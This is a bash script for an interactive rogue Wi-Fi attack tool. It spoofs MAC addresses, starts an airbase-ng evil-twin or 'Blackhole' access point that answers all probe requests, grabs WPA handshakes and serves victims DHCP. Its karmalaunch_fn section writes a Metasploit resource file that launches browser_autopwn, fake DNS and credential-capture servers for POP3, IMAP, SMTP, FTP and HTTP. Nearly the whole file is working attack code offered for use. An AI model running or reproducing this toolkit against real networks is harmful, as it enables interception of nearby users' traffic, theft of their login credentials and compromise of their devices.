#!/bin/bash

# ~~~~~~~~~~  Environment Setup ~~~~~~~~~~ #

# Text color variables - saves retyping these awful ANSI codes

txtrst="\e[0m"      # Text reset

def="\e[1;34m"      # default           blue
warn="\e[1;31m"     # warning           red
info="\e[1;34m"     # info              blue
q="\e[1;32m"        # questions         green
inp="\e[1;36m"      # input variables   magenta

# Eterm config
echo "<Eterm-0.9.6>
# Eterm Configuration File
begin imageclasses
    begin image
      type background
      mode solid
      state normal
    end image
end" > /usr/share/Eterm/themes/Eterm/user.cfg

printf "\e[8;40;85;t"       # resize terminal
clear

# ~~~~~~~~~ Globals ~~~~~~~~~ #

# AP
AP_IP="192.168.0.1"
AP_SM="255.255.255.0"
AP_CH="11"
AP_MTU="1500"
AP_ENCRYPT="open"
AP_PASSWD=
AP_TYPE=
AP_INTERNET_INTERFACE=
AP_INTERFACE=
AP_INTERFACE_MON="ap"

# DHCP
DHCP_IP="192.168.0.1"
DHCP_SM="255.255.255.0"
DHCP_SUBNET="192.168.0.0"
DHCP_RANGE="192.168.0.100 192.168.0.200"

# Utilities
INTERFACE=
MAC=
EVENT_MESSAGE="Hello World!"

# ~~~~~~~~~~ Intro ~~~~~~~~~~ #
init_fn()
{
    # Trap Ctrl-C
    trap exit_fn INT 
    # Clear iptables
    iptables --flush    # delete all rules in default (filter) table
    iptables -t nat --flush
    iptables -t mangle --flush
    iptables -X         # delete user-defined chains
    iptables -t nat -X
    iptables -t mangle -X
    
    menu_fn
}

menu_fn()
{       
    clear
    echo -e "\e[1;37m                                                                

               █████╗ ██╗   ██╗ ██╗ ██████╗██╗  ██╗   ███████╗██╗  ██╗
              ██╔══██╗██║   ██║███║██╔════╝██║ ██╔╝   ██╔════╝██║  ██║
              ╚██████║██║   ██║╚██║██║     █████╔╝    ███████╗███████║
               ╚═══██║██║   ██║ ██║██║     ██╔═██╗    ╚════██║██╔══██║
               █████╔╝╚██████╔╝ ██║╚██████╗██║  ██╗██╗███████║██║  ██║
               ╚════╝  ╚═════╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝

    >$inp $EVENT_MESSAGE
    "
    echo -e "$def
    1) MAC Change
    2) FruityWifi (install)
    
    3) Sniffy Wify
    
    q) Exit"

    read apusage

    case $apusage in
    	1)  macchange_fn;;
        2)  fruitywifi_fn;;
        
        3)  ap_setup_fn
            ap_type_fn
            ap_start_fn
            
            dhcp_setup_fn
            dhcp_start_fn
            EVENT_MESSAGE="Started $q Sniffy Wify $inp"
            menu_fn;;
            
        q)  exit_fn;;
    esac

    exit_fn
}

exit_fn()
{
    clear
    echo -e "$info\nStopping processes...\n"
    killall -q tail airbase-ng ferret sslstrip aireplay-ng airodump-ng dhcpd &> /dev/null
    sleep 1
    echo -e "$info\n\nStopping monitor interfaces...\n"
    airmon-ng stop $AP_INTERFACE_MON &> /dev/null

    iptables --flush    # delete all rules in default (filter) chains
    iptables -t nat --flush
    iptables -t mangle --flush
    iptables -X         # delete user-defined chains
    iptables -t nat -X
    iptables -t mangle -X
    clear
    echo -e "\e[0m"     # reset colours
    clear
    exit 0
}

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# ~~~~~~~~~~~~ Functions ~~~~~~~~~~~~ #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

macchange_fn()
{
    # Utils Variables
    INTERFACE=
    MAC=
    
    if [[ -z $TEMP_MAC_INTERFACE ]];then
        selectinterface_fn
        INTERFACE="$TEMP_INTERFACE"
    else
        INTERFACE="$TEMP_MAC_INTERFACE"
    fi

    if [[ -z $rand ]];then
        echo -e "$q\nRandom MAC? (y). Or manual (m)"
        read rand
    fi
    case $rand in
        y|Y) ifconfig $INTERFACE down && macchanger -A $INTERFACE && ifconfig $INTERFACE up
             getmac_fn;;
    
        m|M) while [ -z $MAC ]; do
                echo -e "$q\nDesired MAC Address for $inp $INTERFACE $q?"
                read custom_mac

                if [[ "$custom_mac" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]]; then           
                    ifconfig $INTERFACE down && macchanger -m $custom_mac $INTERFACE && ifconfig $INTERFACE up
                    getmac_fn
                else
                    echo -e "$warn\nInvalid MAC address!"
                    custom_mac=
                fi
            done;;
                 
        *)  echo -e "$warn\nInvalid. Start again."
            rand=
            custom_mac=
            macchange_fn;;
    esac
    
    # Clean
    rand=
    custom_mac=
    TEMP_MAC_INTERFACE=
    EVENT_MESSAGE="MAC changed for $q $INTERFACE $inp to $q $MAC"
}

fruitywifi_fn(){
    apt-get update
    apt-get install fruitywifi
    /etc/init.d/fruitywifi start
    /etc/init.d/php7-fpm start
    
    EVENT_MESSAGE="Installed and started $q FruityWifi $inp http://localhost:8000"
    menu_fn
}

selectinterface_fn(){
    clear
    
    if [[ -z $TEMP_MSG ]]; then
        TEMP_MSG="Select interface:"
    fi
    
    echo -e "$def\nAvailable interfaces:"
    ifconfig -a | grep eth | awk '{ print $1"   "$5 }' 2>/dev/null                
    ifconfig -a | grep wlan | awk '{ print $1"   "$5 }'
    echo -e "$q\n$TEMP_MSG"
    read TEMP_INTERFACE
    
    # Clean
    TEMP_MSG=
}

startmon_fn(){
    clear
    
    echo -e "$info\nStarting monitoring for $inp$TEMP_MON_START_INTERFACE$info with name $inp$TEMP_MON_START_NAME"
    
    echo -e "$warn\nExecuting $info airmon-ng check kill $warn! This may break your eth0"
    airmon-ng check kill &
    
    iw $TEMP_MON_START_INTERFACE interface add $TEMP_MON_START_NAME type monitor &
    
    airmon-ng start $TEMP_MON_START_NAME &> /dev/null
    
    ifconfig $TEMP_MON_START_NAME down &
    iwconfig $TEMP_MON_START_NAME mode monitor &
    
    while [ -z $t ]; do
        echo -e "$q\nYou want to change MAC? (y/n)"
        read var
        
        case $var in
            
            y|Y)
            TEMP_MAC_INTERFACE="$TEMP_MON_START_NAME"
            macchange_fn
            t="done"
            ;;
            
            n|N)
            ifconfig $TEMP_MON_START_NAME up
            t="done"
            ;;
        esac
    done

    echo -e "$info\nDone"
    sleep 2
}

# ~~~~~~~~~~~~ AP Functions ~~~~~~~~~~ #

ap_setup_fn()
{

    clear
    echo -e "$def

Set the AP Parameters:
        
    1) AP IP Address      $inp[$AP_IP]
    $def
    2) AP Subnet Mask     $inp[$AP_SM]
    $def
    3) AP Channel         $inp[$AP_CH]
    $def
      *It is recommended you start the AP on the same channel as the target*
    
    4) MTU Size           $inp[$AP_MTU]
    $def
    5) Encryption type    $inp[$AP_ENCRYPT]       $AP_PASSWD
    $def
    6) AP Interface       $inp[$AP_INTERFACE]
    $def
    7) AP Internet        $inp[$AP_INTERNET_INTERFACE]  $def(blank if not used)
    
          
    C)ontinue\n"
        read var
        case $var in
        
            1) echo -e "$q\nAP IP Address?"
            read AP_IP
            ap_setup_fn;;
    
            2) echo -e "$q\nAP Subnet Mask?"
            read AP_SM
            ap_setup_fn;;
    
            3) echo -e "$q\nAP Channel?"
            read AP_CH
            case $AP_CH in
                    [1-9]|1[0-4]) ;;
                    *) AP_CH= ;; 
            esac
            ap_setup_fn;;
    
            4) echo -e "$q\nDesired MTU Size?"
            read AP_MTU
            if [[ $AP_MTU -lt 42 || $AP_MTU -gt 6122 ]];then
                AP_MTU=
            fi
            ap_setup_fn;;
            
            5) echo -e "$q\nEncryption type?
                    Open
                    WEP40
                    WEP104
                    WPA (for handshake grabbing only)
                    WPA2 (for handshake grabbing only)"
            read encrypt
            if [[ $AP_ENCRYPT = "WEP40" ]];then
                echo -e "$q\nEnter password (10 character hexadecimal)"
                read AP_PASSWD
                # error check password
                if [[ $(echo $WEPpswd | wc -m) != 11 ]];then # wc counts the return, therefore 11 not 10
                    echo -e "$warn\nInvalid password"
                    sleep 2
                    AP_PASSWD=
                    AP_ENCRYPT=
                    ap_setup_fn
                fi
            elif [[ $AP_ENCRYPT = "WEP104" ]];then
                echo -e "$q\nEnter password (26 character hexadecimal)"
                read AP_PASSWD
                # error check password
                if [[ $(echo $AP_PASSWD|wc -m) != 27 ]];then # counts return, therefore 27 not 26
                    echo -e "$warn\nInvalid password"
                    sleep 1
                    AP_PASSWD=
                    AP_ENCRYPT=
                    ap_setup_fn
                fi
            elif [[ $AP_ENCRYPT != "WPA" && $AP_ENCRYPT != "WPA2" && $AP_ENCRYPT != "open" ]];then
                echo -e "$warn\nInvalid selection"
                sleep 1
                AP_ENCRYPT=
            fi
            ap_setup_fn;;
            
            6) 
            TEMP_MSG="Select interface for AP"
            selectinterface_fn
            # Set ap intrface
            AP_INTERFACE="$TEMP_INTERFACE"
            ap_setup_fn;;
            
            7)
            TEMP_MSG="Select interface for Internet (leave blank for withouth internet):"
            selectinterface_fn
            # Set internet intrface
            AP_INTERNET_INTERFACE="$TEMP_INTERFACE"
            ap_setup_fn;;
    
            c|C) if [[ -z $AP_IP || -z $AP_SM || -z $AP_INTERFACE || -z $AP_MTU || -z $AP_ENCRYPT ]];then # check all variables are set
                echo -e "$warn\nNot so fast, all fields must be filled before proceeding"
                sleep 2
                ap_setup_fn
                fi;;
        
    *) ap_setup_fn;;
    
    esac
}

ap_type_fn()
{
    AP_TYPE= # nulled; if this is repeat run-through, BB would exist, and the while loop would not trigger 
    while [ -z $AP_TYPE ];do
        echo -e "$q 

Choose Type of AP: 

    1) Blackhole--> Responds to All probe requests

    2) Bullzeye--> Broadcasts only the specified ESSID

    3) Both--> Responds to all, otherwise broadcasts specified\n"
                
        read AP_TYPE
    done

    case $AP_TYPE in
        [1-3]) ;;
        *) ap_type_fn;;
    esac
}

ap_start_fn()
{
    if [[ $AP_INTERNET_INTERFACE ]];then
        # forward at0 to the internet
        iptables -t nat -A POSTROUTING -o $AP_INTERNET_INTERFACE -j MASQUERADE
    fi
    
    # Start monitoring interface
    TEMP_MON_START_INTERFACE="$AP_INTERFACE"
    TEMP_MON_START_NAME="$AP_INTERFACE_MON"
    startmon_fn
    
    
    if [[ $AP_ENCRYPT = "Open" ]];then
        cmd=
    elif [[ $AP_ENCRYPT = "WEP40" ]];then
        cmd="-w $AP_PASSWD"
    elif [[ $AP_ENCRYPT = "WEP104" ]];then
        cmd="-w $AP_PASSWD"
    elif [[ $AP_ENCRYPT = "WPA" ]];then
        cmd="-z 2 -W 1 -F 9u1ck"
    elif [[ $AP_ENCRYPT = "WPA2" ]];then
        cmd="-Z 4 -W 1 -F 9u1ck"
    fi

    # Set channel
    if [[ $AP_CH ]]; then
        cmd="$cmd -c $AP_CH"
    fi
    
    # blackhole targets every probe request
    if [[ $AP_TYPE = "1" ]]; then
            cmd="$cmd -P -C 60 -v $AP_INTERFACE_MON"
    # bullzeye broadcasts specified ESSID only
    elif [[ $AP_TYPE = "2" ]]; then
            while [ -z $ESSID ];do
                    echo -e "$q\nDesired ESSID?"
                    read ESSID
            done
            cmd="$cmd -e $ESSID -v $AP_INTERFACE_MON"
    # both
    elif [[ $AP_TYPE = "3" ]];then 
            while  [ -z "$ESSID" ];do
                    echo -e "$q\nDesired ESSID?"
                    read ESSID
            done
            cmd="$cmd -e $ESSID -P -C 60 -v $AP_INTERFACE_MON"
    fi
    
    # Start AP
    Eterm -g 80x12-0+0 --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -q -T "AP Monitor" -e airbase-ng $cmd 2> /dev/null &
    
    clear
    
    echo -e "$info\nStarting airbase-ng..."
    sleep 6 # for at0 to be started - crucial
    ifconfig at0 up $AP_IP netmask $AP_SM
    ifconfig at0 mtu $AP_MTU
}

# ~~~~~~~~~~ DHCP Functions ~~~~~~~~~~ #

dhcp_setup_fn()
{
    clear
    echo -e "$def

Check DHCP Server Parameters:


    1) Gateway IP Address  $inp[$DHCP_IP]
$def
    2) Subnet Mask         $inp[$DHCP_SM]
$def
    3) Subnet              $inp[$DHCP_SUBNET]
$def
    4) IP Range            $inp[$DHCP_RANGE]
$def
    C)ontinue

\n"
    read var
    case $var in
    
        1) echo -e "$inp\nGateway IP Address?"
        read DHCP_IP
        dhcp_setup_fn;;
    
        2) echo -e "$inp\nSubnet Mask?"
        read DHCP_SM
        dhcp_setup_fn;;
    
        3) echo -e "$inp\nSubnet?"
        read DHCP_SUBNET
        dhcp_setup_fn;;
    
        4) echo -e "$inp\nIP Range?"
        read DHCP_RANGE    
        dhcp_setup_fn;;

        c|C) if [[ -z $DHCP_IP || -z $DHCP_SM || -z $DHCP_SUBNET || -z $DHCP_RANGE ]];then
                echo -e "$warn Get a grip - you've missed something"
                sleep 1
                dhcp_setup_fn
            fi;;
    
        *) dhcp_setup_fn;;
    esac

}

dhcp_start_fn()
{
    echo > /var/lib/dhcp/dhcpd.leases  # Clear any pre-existing dhcp leases
    cat /dev/null > /tmp/dhcpd.conf

    # need a working nameserver from our internet connection
    var=$(grep "nameserver" /etc/resolv.conf | awk '{print $2}' |wc -l) # count the number of nameservers in resolv.conf
    if [[ $var = 1 ]];then  # if 1, use it in dhcpd.conf
        apdns=$(grep nameserver /etc/resolv.conf | awk '{print $2}')
    elif [[ $var > 1 ]];then  # if more than 1 nameserver, manipulate string into an acceptable form for dhcpd.conf
        apdns=$(grep nameserver /etc/resolv.conf | awk '{print $2}' | tr '\n' ',')      # replace newlines with commas
        apdns=${apdns//,/", "}                                                          # add a space after all commas
        apdns=${apdns%", "}                                                             # delete the final comma/space
    else apdns="8.8.8.8"        # default in case resolv.conf is empty
    fi
        
    echo -e "$info\nGenerating /tmp/dhcpd.conf"
    echo "default-lease-time 300;"> /tmp/dhcpd.conf
    echo "max-lease-time 360;" >> /tmp/dhcpd.conf
    echo "ddns-update-style none;" >> /tmp/dhcpd.conf
    echo "authoritative;" >> /tmp/dhcpd.conf
    echo "log-facility local7;" >> /tmp/dhcpd.conf
    echo "subnet $DHCP_SUBNET netmask $DHCP_SM {" >> /tmp/dhcpd.conf
    echo "range $DHCP_RANGE;" >> /tmp/dhcpd.conf
    echo "option routers $DHCP_IP;" >> /tmp/dhcpd.conf
    echo "option domain-name-servers $apdns;" >> /tmp/dhcpd.conf
    echo "}"  >> /tmp/dhcpd.conf

    dhcpd -cf /tmp/dhcpd.conf at0 &
    route add -net $DHCP_SUBNET netmask $DHCP_SM gw $DHCP_IP
    iptables -P FORWARD ACCEPT  # probably not necessary 'coz we flushed the chains earlier
    sleep 1         # for dhcpd to start
    
    Eterm -g 80x40-0+225 --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 -r --font-fx none --buttonbar 0  --scrollbar 0 -q -T "DHCP Server Tail" -e tail -f /var/lib/dhcp/dhcpd.leases 2> /dev/null &
    sleep 3
}

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# ~~~~~~~~~~~~ Exploits ~~~~~~~~~~~~~ #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
 
karmalaunch_fn()
{
    iptables -t nat -A PREROUTING -i at0 -j REDIRECT
    service apache2 stop # will interfere with metasploit's server
    cat /dev/null > /tmp/karma.rc > /dev/null # clear pre-existing karma.rc
    echo "use auxiliary/server/browser_autopwn" > /tmp/karma.rc
    echo "setg AUTOPWN_HOST $DHCP_IP" >> /tmp/karma.rc
    echo "setg AUTOPWN_PORT 55550" >> /tmp/karma.rc
    echo "setg AUTOPWN_URI /ads" >> /tmp/karma.rc
    echo "set LHOST $DHCP_IP" >> /tmp/karma.rc
    echo "set LPORT 45000" >> /tmp/karma.rc
    echo "set SRVPORT 55550" >> /tmp/karma.rc
    echo "set URIPATH /ads" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/capture/pop3" >> /tmp/karma.rc
    echo "set SRVPORT 110" >> /tmp/karma.rc
    echo "set SSL false" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/capture/pop3" >> /tmp/karma.rc
    echo "set SRVPORT 995" >> /tmp/karma.rc
    echo "set SSL true" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/capture/ftp" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/capture/imap" >> /tmp/karma.rc
    echo "set SSL false" >> /tmp/karma.rc
    echo "set SRVPORT 143" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/capture/imap" >> /tmp/karma.rc
    echo "set SSL true" >> /tmp/karma.rc
    echo "set SRVPORT 993" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/capture/smtp" >> /tmp/karma.rc
    echo "set SSL false" >> /tmp/karma.rc
    echo "set SRVPORT 25" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/capture/smtp" >> /tmp/karma.rc
    echo "set SSL true" >> /tmp/karma.rc
    echo "set SRVPORT 465" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/fakedns" >> /tmp/karma.rc
    echo "unset TARGETHOST" >> /tmp/karma.rc
    echo "set SRVPORT 5353" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/fakedns" >> /tmp/karma.rc
    echo "unset TARGETHOST" >> /tmp/karma.rc
    echo "set SRVPORT 53" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/capture/http" >> /tmp/karma.rc
    echo "set SRVPORT 80" >> /tmp/karma.rc
    echo "set SSL false" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/capture/http" >> /tmp/karma.rc
    echo "set SRVPORT 8080" >> /tmp/karma.rc
    echo "set SSL false" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/capture/http" >> /tmp/karma.rc
    echo "set SRVPORT 443" >> /tmp/karma.rc
    echo "set SSL true" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/capture/http" >> /tmp/karma.rc
    echo "set SRVPORT 8443" >> /tmp/karma.rc
    echo "set SSL true" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    sleep 1
    
    echo -e "$info\nLaunching karmetasploit..." 
    
    msfconsole -r /tmp/karma.rc 2> /dev/null &
    
    sleep 8
    echo -e "$info\nBe patient..."
    sleep 8
    echo -e "$info\nBe patient..."
    sleep 16
    echo -e "$info\nBe very patient..."
    sleep 24
    echo -e "$info\nCount the sessions!!!"
    sleep 8
    echo -e "$info\nLmao. You won't get any shells against modern systems ;-)"
    sleep 8
}

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# ~~~~~~~~~~~ Utilities ~~~~~~~~~~~~~ #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

getmac_fn() {
     sleep 2     # crucial, to let INTERFACE come up before setting MAC 
     MAC=$(ifconfig $INTERFACE | awk 'FNR == 2 {print $2}')
}

### START ###
init_fn

